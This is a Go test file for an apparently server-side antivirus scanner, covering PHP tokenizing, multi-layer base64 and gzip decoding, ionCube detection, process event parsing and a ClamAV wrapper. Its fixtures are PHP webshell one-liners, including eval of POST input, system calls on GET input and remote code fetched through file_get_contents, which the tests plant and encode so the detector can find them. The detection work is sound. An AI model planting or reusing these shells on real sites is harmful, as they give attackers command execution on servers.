package antivirus

import (
	"bytes"
	"compress/gzip"
	"compress/zlib"
	"encoding/base64"
	"encoding/binary"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

// Every operator token the fold detectors read, the null-safe member access
// among them.
func TestPHPTokenizeReadsEveryOperator(t *testing.T) {
	got := phpTokenize([]byte("<?php $a .= 'x'; $b = $c == $d; $e => $f; $g->h; K::i; $j?->k;"))
	v := func(s string) semToken { return semToken{kind: stVar, val: s} }
	o := func(s string) semToken { return semToken{kind: stOther, val: s} }
	id := func(s string) semToken { return semToken{kind: stIdent, val: s} }
	semi := semToken{kind: stSemi}
	want := []semToken{
		v("$a"), {kind: stDotEq, val: ".="}, {kind: stStr, val: "x", constant: true}, semi,
		v("$b"), {kind: stAssign}, v("$c"), o("=="), v("$d"), semi,
		v("$e"), o("=>"), v("$f"), semi,
		v("$g"), o("->"), id("h"), semi,
		id("K"), o("::"), id("i"), semi,
		v("$j"), o("?->"), id("k"), semi,
	}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("tokens =\n%+v\nwant\n%+v", got, want)
	}
}

// A sink name built from literal pieces and called in place is reported once.
func TestSemanticFindsAConcatenatedSinkCalledInline(t *testing.T) {
	got := semanticMatches(".php", []byte("<?php 'sy'.'stem'('id');"), nil)
	want := []match{{name: "PHP.Semantic.ConcatenatedSink", score: weightProof}}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("matches = %+v, want %+v", got, want)
	}
}

// Every escape a double-quoted string resolves, and a resolved escape that
// crosses the fold ceiling makes the string non-constant.
func TestDoubleQuoteResolvesEveryEscape(t *testing.T) {
	src := []byte(`"a\\b\"c\$d\ne\tf\x41\101\q"`)
	val, constant, next := doubleQuote(src, 0)
	if val != "a\\b\"c$d\ne\tfAAq" || !constant || next != len(src) {
		t.Fatalf("doubleQuote = %q, %v, %d", val, constant, next)
	}

	long := []byte("\"" + strings.Repeat("a", semMaxFoldBytes) + "\\n\"")
	val, constant, next = doubleQuote(long, 0)
	if len(val) != semMaxFoldBytes+1 || constant || next != len(long) {
		t.Fatalf("an escape past the ceiling = %d bytes, %v, %d", len(val), constant, next)
	}
}

// The heredoc opener: blanks before the label, a quoted label, an empty label
// and text after the label on the opening line.
func TestHeredocReadsItsOpeningLine(t *testing.T) {
	cases := []struct {
		name     string
		src      string
		val      string
		constant bool
		next     int
	}{
		{"a nowdoc after a blank", "<<< 'EOT'\nbody $x\nEOT;\nrest", "body $x\n", true, 23},
		{"a quoted heredoc that interpolates", "<<<\t\"EOT\"\nhi {$x}\nEOT\n", "hi {$x}\n", false, 22},
		{"no label", "<<<(", "", false, 3},
		{"text after the label", "<<<EOT junk\nEOT\n", "", true, 16},
		{"no closing label", "<<<EOT\nno end", "", false, 13},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			val, constant, next := heredoc([]byte(c.src), 0)
			if val != c.val || constant != c.constant || next != c.next {
				t.Fatalf("heredoc = %q, %v, %d; want %q, %v, %d", val, constant, next, c.val, c.constant, c.next)
			}
		})
	}
}

// The subscript skip stops at the end of the tokens, answers the index it was
// given when there is no subscript, steps over a nested one, and is bounded.
func TestSkipIndexStepsOverOneSubscript(t *testing.T) {
	br := func(v string) semToken { return semToken{kind: stOther, val: v} }
	name := semToken{kind: stVar, val: "$_GET"}
	unclosed := []semToken{br("[")}
	for range 300 {
		unclosed = append(unclosed, br("x"))
	}
	cases := []struct {
		name        string
		toks        []semToken
		start, want int
	}{
		{"past the end", []semToken{name}, 1, 1},
		{"no subscript", []semToken{name, {kind: stLParen}}, 1, 1},
		{"a nested subscript", []semToken{name, br("["), name, br("["), {kind: stStr, val: "x"}, br("]"), br("]"), {kind: stLParen}}, 1, 7},
		{"an unclosed subscript", unclosed, 0, semMaxIndexTok},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := (&semState{toks: c.toks}).skipIndex(c.start); got != c.want {
				t.Fatalf("skipIndex(%d) = %d, want %d", c.start, got, c.want)
			}
		})
	}
}

func charB64(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

// charEncodeTimes base64-encodes s the given number of times.
func charEncodeTimes(s string, times int) string {
	for range times {
		s = charB64(s)
	}
	return s
}

func matchNames(matches []match) []string {
	names := make([]string, 0, len(matches))
	for _, m := range matches {
		names = append(names, m.name)
	}
	return names
}

// One decoded layer that matches many rules contributes eight findings at most.
func TestDecodedMatchesStopsAtEightFindings(t *testing.T) {
	payload := strings.Join([]string{
		"eval(base64_decode('x'));",
		"preg_replace('/a/e', 'b', 'c');",
		"assert($_GET['a']);",
		"system($_GET['b']);",
		"c99shell",
		"eval($_POST['c']);",
		"$f($_GET['d']);",
		"call_user_func($_GET['e']);",
		"eval(file_get_contents('http://x'));",
		"@system('id');",
	}, "\n")
	got := decodedMatches(".php", []byte("<?php $p = '"+charB64(payload)+"';"), nil)
	want := []string{
		"Decoded:PHP.Webshell.EvalBase64", "Decoded:PHP.Webshell.PregReplaceE", "Decoded:PHP.Webshell.AssertInput",
		"Decoded:PHP.Webshell.SystemInput", "Decoded:PHP.Webshell.KnownMarker", "Decoded:PHP.Webshell.EvalSuperglobal",
		"Decoded:PHP.Webshell.VariableFunction", "Decoded:PHP.Webshell.CallUserFuncInput",
	}
	if names := matchNames(got); !reflect.DeepEqual(names, want) {
		t.Fatalf("decoded matches =\n%q\nwant\n%q", names, want)
	}
}

// The decode follows four layers and no more, reads a repeated blob once, and
// does not reward a rule that already fired in clear.
func TestDecodedMatchesBoundsTheWalk(t *testing.T) {
	const shell = "<?php system($_GET['x']); ?>"
	found := []string{"Decoded:PHP.Webshell.SystemInput"}
	blob := charB64(shell)
	cases := []struct {
		name  string
		file  string
		clear map[string]bool
		want  []string
	}{
		{"four layers down", "<?php $a='" + charEncodeTimes(shell, 4) + "';", nil, found},
		{"five layers down", "<?php $a='" + charEncodeTimes(shell, 5) + "';", nil, []string{}},
		{"the same blob twice", "<?php $a='" + blob + "'; $b='" + blob + "';", nil, found},
		{"a rule already fired in clear", "<?php $a='" + blob + "';", map[string]bool{"PHP.Webshell.SystemInput": true}, []string{}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if names := matchNames(decodedMatches(".php", []byte(c.file), c.clear)); !reflect.DeepEqual(names, c.want) {
				t.Fatalf("decoded matches = %q, want %q", names, c.want)
			}
		})
	}
}

// One decode layer charges every decoded byte to the budget: nothing is added
// without budget, a blob is cut to what is left, and a run that does not decode
// adds nothing.
func TestDecodeLayerChargesTheBudget(t *testing.T) {
	data := []byte("x='" + charB64("<?php system($_GET['x']); ?>") + "'")
	cases := []struct {
		name   string
		data   []byte
		budget int
		want   [][]byte
		left   int
	}{
		{"no budget", data, 0, nil, 0},
		{"a budget shorter than the blob", data, 5, [][]byte{[]byte("<?php")}, 0},
		{"a run that does not decode", []byte("x='" + strings.Repeat("A", 25) + "'"), 100, nil, 100},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			budget := c.budget
			if got := decodeLayer(c.data, &budget); !reflect.DeepEqual(got, c.want) || budget != c.left {
				t.Fatalf("decodeLayer = %q with %d left, want %q with %d", got, budget, c.want, c.left)
			}
		})
	}
}

func charGzip(t *testing.T, data []byte) []byte {
	t.Helper()
	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	if _, err := w.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func charZlib(t *testing.T, data []byte) []byte {
	t.Helper()
	var buf bytes.Buffer
	w := zlib.NewWriter(&buf)
	if _, err := w.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

// inflate tries gzip then zlib, refuses a blob too short or a spent budget, and
// charges a bomb's output to the budget even though it rejects it.
func TestInflateTriesEachFormat(t *testing.T) {
	text := []byte("<?php echo 'inflated'; ?>")
	zeros := make([]byte, 100000)
	cases := []struct {
		name   string
		input  []byte
		budget int
		want   []byte
		spent  int
	}{
		{"a blob too short", []byte{1, 2, 3}, 100, nil, 0},
		{"no budget left", charGzip(t, text), 0, nil, 0},
		{"gzip", charGzip(t, text), 1000, text, len(text)},
		{"a gzip header over a broken stream", []byte{0x1f, 0x8b, 0, 0, 0}, 1000, nil, 0},
		{"zlib", charZlib(t, text), 1000, text, len(text)},
		{"a decompression bomb", charGzip(t, zeros), 1 << 20, nil, len(zeros)},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			budget := c.budget
			if got := inflate(c.input, &budget); !bytes.Equal(got, c.want) || c.budget-budget != c.spent {
				t.Fatalf("inflate = %q spending %d, want %q spending %d", got, c.budget-budget, c.want, c.spent)
			}
		})
	}
}

// A raw binary body after an encoder stamp starts at its first binary byte; a
// short binary run before it does not count.
func TestEncoderBlobStartFindsABinaryBody(t *testing.T) {
	head := "<?php //ICB0 82:0 83:e7bc\n"
	content := []byte(head + strings.Repeat("\x01", 10) + "text" + strings.Repeat("\x02", encoderBinaryRun) + "tail")
	name, offset, ok := encoderBlobStart(content)
	if name != "ionCube" || offset != len(head)+14 || !ok {
		t.Fatalf("encoderBlobStart = %q, %d, %v", name, offset, ok)
	}
}

// charConnectorPayload builds a connector message: the id, an event kind, and
// the event data words.
func charConnectorPayload(idx, val, what uint32, data ...uint32) []byte {
	p := make([]byte, 36)
	binary.LittleEndian.PutUint32(p[0:], idx)
	binary.LittleEndian.PutUint32(p[4:], val)
	binary.LittleEndian.PutUint32(p[20:], what)
	for _, d := range data {
		p = binary.LittleEndian.AppendUint32(p, d)
	}
	return p
}

// Every kind of connector message the parser reads or refuses.
func TestParseOneEventReadsEachKind(t *testing.T) {
	exec42 := charConnectorPayload(cnIdxProc, cnValProc, procEventExec, 42, 42)
	cases := []struct {
		name   string
		nlType uint16
		p      []byte
		want   procEvent
		ok     bool
	}{
		{"an error message", 0x2, exec42, procEvent{}, false},
		{"a no-op message", 0x1, exec42, procEvent{}, false},
		{"a short payload", 0x3, charConnectorPayload(cnIdxProc, cnValProc, procEventExec), procEvent{}, false},
		{"another connector", 0x3, charConnectorPayload(2, cnValProc, procEventExec, 42, 42), procEvent{}, false},
		{"an exec", 0x3, exec42, procEvent{kind: procEventExec, pid: 42}, true},
		{"an exec of pid 0", 0x3, charConnectorPayload(cnIdxProc, cnValProc, procEventExec, 0, 0), procEvent{}, false},
		{"a fork too short", 0x3, charConnectorPayload(cnIdxProc, cnValProc, procEventFork, 10, 10), procEvent{}, false},
		{"a fork", 0x3, charConnectorPayload(cnIdxProc, cnValProc, procEventFork, 10, 10, 11, 11), procEvent{kind: procEventFork, pid: 11, parent: 10}, true},
		{"an exit", 0x3, charConnectorPayload(cnIdxProc, cnValProc, procEventExit, 7, 7), procEvent{kind: procEventExit, pid: 7}, true},
		{"an exit of pid 0", 0x3, charConnectorPayload(cnIdxProc, cnValProc, procEventExit, 0, 0), procEvent{}, false},
		{"a kind not tracked", 0x3, charConnectorPayload(cnIdxProc, cnValProc, 0x4, 1, 1), procEvent{}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got, ok := parseOneEvent(c.nlType, c.p); got != c.want || ok != c.ok {
				t.Fatalf("parseOneEvent = %+v, %v; want %+v, %v", got, ok, c.want, c.ok)
			}
		})
	}
}

// fakeClamscan installs a clamscan that records its arguments and prints lines.
func fakeClamscan(t *testing.T, lines ...string) string {
	t.Helper()
	dir := t.TempDir()
	script := filepath.Join(dir, "clamscan")
	quoted := make([]string, 0, len(lines))
	for _, l := range lines {
		quoted = append(quoted, "'"+l+"'")
	}
	body := "#!/bin/sh\nprintf '%s\\n' \"$@\" > \"$0.args\"\nprintf '%s\\n' " + strings.Join(quoted, " ") + "\n"
	if err := os.WriteFile(script, []byte(body), 0o700); err != nil {
		t.Fatal(err)
	}
	t.Setenv("SERVIKA_CLAMSCAN_BIN", script)
	return script
}

// ClamAV's FOUND lines become one critical finding per file, and a line without
// a file separator is ignored.
func TestRunScanRecordsEachClamAVFileOnce(t *testing.T) {
	root := t.TempDir()
	script := fakeClamscan(t,
		"/x/a.php: Php.Webshell FOUND", "/x/a.php: Other FOUND", "noise line", "/x/b.php:Bad FOUND", "garbage FOUND")
	scanned, skipped, findings, complete := runScan(t.Context(), root, ScanRequest{Roots: []string{root}}, nil)
	want := []Finding{{File: "/x/a.php", Signature: "Php.Webshell", Engine: "clamav", Score: scoreCritical, Level: LevelCritical}}
	if !reflect.DeepEqual(findings, want) || scanned != 0 || skipped != 0 || !complete {
		t.Fatalf("runScan = %d, %d, %+v, %v", scanned, skipped, findings, complete)
	}
	args, err := os.ReadFile(script + ".args")
	if err != nil {
		t.Fatal(err)
	}
	wantArgs := "-r\n-i\n--no-summary\n--stdout\n--max-filesize=25M\n--max-scansize=500M\n" + root + "\n"
	if string(args) != wantArgs {
		t.Fatalf("clamscan args = %q, want %q", args, wantArgs)
	}
}

const charShell = "<?php eval($_POST['c']); ?>"

func plantFile(t *testing.T, root, rel, body string) string {
	t.Helper()
	path := filepath.Join(root, rel)
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	return path
}

func findingBases(findings []Finding) []string {
	out := make([]string, 0, len(findings))
	for _, f := range findings {
		out = append(out, filepath.Base(f.File))
	}
	return out
}

// The walk skips a .git directory, an excluded file and a directory it cannot
// read, and still reports the rest of the tree as complete.
func TestRunScanWalkSkipsWhatItMustNotRead(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root reads a directory whatever its mode")
	}
	t.Setenv("SERVIKA_CLAMSCAN_BIN", filepath.Join(t.TempDir(), "absent"))
	root := t.TempDir()
	plantFile(t, root, ".git/hooks/shell.php", charShell)
	skip := plantFile(t, root, "skip.php", charShell)
	plantFile(t, root, "shell.php", charShell)
	locked := filepath.Join(root, "locked")
	plantFile(t, locked, "inner.php", charShell)
	if err := os.Chmod(locked, 0o000); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(locked, 0o700) })

	req := DefaultRequest(root)
	req.Excluded = []string{skip}
	scanned, _, findings, complete := runScan(t.Context(), root, req, nil)
	if bases := findingBases(findings); !reflect.DeepEqual(bases, []string{"shell.php"}) || scanned != 1 || !complete {
		t.Fatalf("runScan = %d scanned, %q, complete %v", scanned, bases, complete)
	}
}

// A file the last sweep found clean and that has not changed is skipped and
// recorded clean again.
func TestRunScanSkipsAFileTheCacheHoldsClean(t *testing.T) {
	t.Setenv("SERVIKA_CLAMSCAN_BIN", filepath.Join(t.TempDir(), "absent"))
	root := t.TempDir()
	path := plantFile(t, root, "shell.php", charShell)
	fi, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	key := fileKey(fi)
	if key == "" {
		t.Skip("this platform gives no ctime, so nothing is ever cached")
	}
	cache := &scanCache{old: map[string]string{path: key}, fresh: map[string]string{}}
	scanned, skipped, findings, complete := runScan(t.Context(), root, DefaultRequest(root), cache)
	if scanned != 0 || skipped != 1 || len(findings) != 0 || !complete || cache.fresh[path] != key {
		t.Fatalf("runScan = %d, %d, %+v, %v; fresh %v", scanned, skipped, findings, complete, cache.fresh)
	}
}
